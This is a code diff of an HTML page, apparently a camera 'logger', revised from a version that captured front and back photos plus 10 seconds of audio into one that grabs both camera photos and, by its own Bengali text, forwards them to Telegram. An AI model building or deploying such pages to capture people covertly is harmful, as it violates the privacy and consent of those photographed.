@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Educational Logger</title>
+  <title>Super Fast Camera Logger</title>
   <style>
     body {
       text-align: center;
@@ -12,35 +12,35 @@
       background: #f8f9fa;
       color: #333;
     }
-    h2 { color: #222; margin-bottom: 20px; }
-    p { max-width: 600px; margin: 0 auto 30px; color: #555; }
+    h2 { color: #222; margin-bottom: 30px; }
+    p { max-width: 600px; margin: 0 auto 40px; color: #555; font-size: 18px; }
     button {
-      padding: 16px 50px;
-      margin: 20px 10px;
-      font-size: 18px;
+      padding: 18px 60px;
+      font-size: 20px;
       cursor: pointer;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       color: white;
+      background: #007bff;
+      transition: background 0.2s;
     }
-    button.primary { background: #007bff; }
-    button.primary:hover { background: #0069d9; }
+    button:hover { background: #0062cc; }
     button:disabled { opacity: 0.5; cursor: not-allowed; }
     #status {
-      font-size: 16px;
-      color: #555;
-      margin: 30px 0;
+      font-size: 17px;
+      margin-top: 40px;
+      color: #444;
       min-height: 30px;
     }
   </style>
 </head>
 <body>
 
-  <h2>Educational Logger</h2>
-  <p>Click to capture 1 front photo + 1 back photo (super fast) + record 10s audio and send</p>
+  <h2>Super Fast Dual Camera Capture</h2>
+  <p>বাটন ক্লিক করলেই front + back camera থেকে ২টা ছবি সাথে সাথে Telegram-এ চলে যাবে</p>
 
-  <button class="primary" id="captureBtn" onclick="capturePhotosAndRecordAudio()">
-    Capture Front + Back Photo + 10s Audio
+  <button id="captureBtn" onclick="captureBothCameras()">
+    Front + Back Photo Send
   </button>
 
   <div id="status"></div>
@@ -49,65 +49,43 @@
     const btn = document.getElementById('captureBtn');
     const status = document.getElementById('status');
 
-    async function capturePhotosAndRecordAudio() {
+    async function captureBothCameras() {
       btn.disabled = true;
-      btn.textContent = "Processing...";
+      btn.textContent = "Capturing...";
       status.textContent = "";
 
-      let frontStream = null;
-      let backStream = null;
-      let audioStream = null;
-      let recorder = null;
-
       try {
-        // ১. Front camera photo (super fast)
-        status.textContent = "Capturing front photo...";
-        frontStream = await navigator.mediaDevices.getUserMedia({
+        // Front camera photo
+        status.textContent = "Front camera capturing...";
+        const frontStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }
         });
-        const frontPhoto = await quickCapturePhoto(frontStream);
-        await sendPhoto(frontPhoto, "front");
+        const frontBase64 = await capturePhoto(frontStream);
+        await sendPhoto(frontBase64, "front");
 
-        // ২. Back camera photo (super fast)
-        status.textContent = "Capturing back photo...";
-        backStream = await navigator.mediaDevices.getUserMedia({
+        // Back camera photo
+        status.textContent = "Back camera capturing...";
+        const backStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "environment" }
         });
-        const backPhoto = await quickCapturePhoto(backStream);
-        await sendPhoto(backPhoto, "back");
+        const backBase64 = await capturePhoto(backStream);
+        await sendPhoto(backBase64, "back");
 
-        // ৩. ১০ সেকেন্ডের অডিও রেকর্ড (microphone)
-        status.textContent = "Recording 10s audio...";
-        audioStream = await navigator.mediaDevices.getUserMedia({
-          audio: true,
-          video: false
-        });
-
-        const chunks = [];
-        recorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-
-        recorder.ondataavailable = e => chunks.push(e.data);
-
-        recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'audio/webm' });
-          await sendAudio(blob);
-          status.textContent = "Done: 2 photos + 10s audio sent";
-          cleanup();
-        };
-
-        recorder.start();
-        setTimeout(() => {
-          if (recorder.state === 'recording') recorder.stop();
-        }, 10000);
-
+        status.textContent = "Both photos sent successfully ✅";
       } catch (err) {
-        status.textContent = "Error: " + (err.name || err.message);
+        let msg = "Error: ";
+        if (err.name === 'NotAllowedError') msg += "Camera permission denied";
+        else if (err.name === 'NotFoundError') msg += "Camera not found";
+        else msg += err.message;
+        status.textContent = msg;
         console.error(err);
-        cleanup();
+      } finally {
+        btn.disabled = false;
+        btn.textContent = "Front + Back Photo Send";
       }
     }
 
-    async function quickCapturePhoto(stream) {
+    async function capturePhoto(stream) {
       const video = document.createElement('video');
       video.srcObject = stream;
       await new Promise(r => { video.onloadedmetadata = r; });
@@ -123,31 +101,12 @@
     }
 
     async function sendPhoto(base64, type) {
-      try {
-        await fetch("/api/send-photo", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ image: base64, camera: type })
-        });
-      } catch {}
-    }
-
-    async function sendAudio(blob) {
-      const formData = new FormData();
-      formData.append('audio', blob, '10s_audio.webm');
-
-      try {
-        await fetch("/api/send-audio", {
-          method: "POST",
-          body: formData
-        });
-      } catch {}
-    }
-
-    function cleanup() {
-      btn.disabled = false;
-      btn.textContent = "Capture Front + Back Photo + 10s Audio";
-      if (recorder && recorder.state !== 'inactive') recorder.stop();
+      const res = await fetch("/api/send-photo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: base64, camera: type })
+      });
+      if (!res.ok) throw new Error("Send failed");
     }
   </script>
 </body>
